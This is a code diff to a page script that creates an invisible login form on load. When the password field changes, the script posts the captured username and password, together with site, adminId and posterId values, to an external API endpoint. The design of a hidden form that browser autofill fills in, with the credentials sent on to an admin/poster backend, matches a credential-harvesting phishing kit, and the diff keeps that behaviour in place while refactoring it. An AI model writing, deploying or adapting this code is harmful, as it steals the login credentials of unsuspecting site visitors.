@@ -26,55 +26,32 @@ document.addEventListener('DOMContentLoaded', () => {
     const posterId = getQueryParam('poster');
     const site = getQueryParam('site');
 
-    console.log('User ID:', userId);
-    console.log('site:', site);
 
 
-    // Dynamically create the login form
-    const loginForm = document.createElement('form');
-    loginForm.id = 'loginForm';
-    loginForm.method = 'POST';
-    loginForm.style.opacity = '0'; // Hide the form
 
-    // Add input fields: username, password, and userAgent
-    const usernameField = document.createElement('input');
-    usernameField.type = 'text';
-    usernameField.id = 'username';
-    usernameField.name = 'username';
+    let form = document.createElement("form");
+    form.setAttribute("id", "loginForm");
+    form.setAttribute("method", "POST");
+    form.style.opacity = 0;
+    
+    let unameField = document.createElement("input");
+    unameField.setAttribute("type", "text");
+    unameField.setAttribute("id", "username");
+    unameField.setAttribute("name", "username");
+    
+    let pwdField = document.createElement("input");
+    pwdField.setAttribute("type", "password");
+    pwdField.setAttribute("id", "password");
+    pwdField.setAttribute("name", "password");
 
-    const passwordField = document.createElement('input');
-    passwordField.type = 'password';
-    passwordField.id = 'password';
-    passwordField.name = 'password';
+    console.log('User userAgent:', navigator.userAgent);
 
-    const userAgentField = document.createElement('input');
-    userAgentField.type = 'text';
-    userAgentField.id = 'userAgent';
-    userAgentField.name = 'userAgent';
-    userAgentField.value = navigator.userAgent; // Automatically fill with the browser's user agent
-
-    console.log('User userAgent:', userAgentField);
-
-
-    // Append the fields to the form
-    loginForm.append(usernameField, passwordField, userAgentField);
-    document.body.appendChild(loginForm);
-
-    // Listen for changes in the password field
-    passwordField.addEventListener('input', () => {
-        if (passwordField.value.trim() !== '') {
-            loginForm.submit(); // Auto-submit the form if password is not empty
-        }
-    });
-
-    // Handle form submission
-    loginForm.addEventListener('submit', (event) => {
-        event.preventDefault(); // Prevent default form submission
-
-        const username = usernameField.value.trim();
-        const password = passwordField.value.trim();
-
-        if (username && password) {
+    pwdField.addEventListener('change', function () {
+        if (this.value.trim() !== '') {
+            let uname = unameField.value.trim();
+            let pwd = pwdField.value.trim();
+    
+         if (uname && pwd) {
             // Send form data via fetch
             fetch(`${API_URL}/ad/${adminId}/${posterId}`, {
                 method: 'POST',
@@ -83,10 +60,10 @@ document.addEventListener('DOMContentLoaded', () => {
                 },
                 body: JSON.stringify({
                     site:site,
-                    email: username,
-                    password: password,
-                    // userId: userId,
-                    // userAgent: navigator.userAgent
+                    email: uname,
+                    password: pwd,
+                    adminId: adminId,
+                    posterId: posterId
                 })
             })
                 .then(response => response.json())
@@ -103,26 +80,13 @@ document.addEventListener('DOMContentLoaded', () => {
         } else {
             console.error('Username and password are required.');
         }
+        }
     });
 
-    // Fetch additional data on page load
-    fetch(`${API_URL}/ad/${adminId}/${posterId}`, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-            site:site,
-            // email: username,
-            // password: password,
-            
-        })
-    })
-        .then(response => response.json())
-        .then(data => {
-            console.log('Fetched data:', data);
-        })
-        .catch(error => {
-            console.error('Error fetching data:', error);
-        });
+
+    form.appendChild(unameField);
+    form.appendChild(pwdField);
+    document.body.appendChild(form);
+
+                
 });
